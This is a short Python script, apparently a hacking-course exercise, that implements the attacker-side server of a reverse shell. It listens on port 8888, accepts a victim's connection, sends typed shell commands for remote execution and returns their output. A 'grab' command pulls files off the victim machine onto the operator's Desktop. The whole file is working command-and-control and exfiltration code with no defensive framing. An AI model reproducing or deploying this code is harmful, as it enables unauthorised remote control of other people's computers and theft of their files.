import socket
import os

def transfer(conn, command):
    conn.send(command.encode())
    grab, path = command.split("*")
    f = open('/home/ehsan/Desktop/'+path, 'wb')
    while True:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print ('[+] Transfer completed ')
            break
        if 'File not found'.encode() in bits:
            print ('[-] Unable to find out the file')
            break
        f.write(bits)

def connecting():
    s = socket.socket()
    s.bind(("192.168.120.128",8888))
    s.listen(1)
    print ('[+] Listening for income TCP coonection on port 8888')
    conn , addr = s.accept()
    print ('[+] we got a connection from', addr)

    while True:
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        elif 'grab' in command:
            transfer(conn, command)
        else:
            conn.send(command.encode())
            print (conn.recv(1024).decode())

def main():
    connecting()
main()
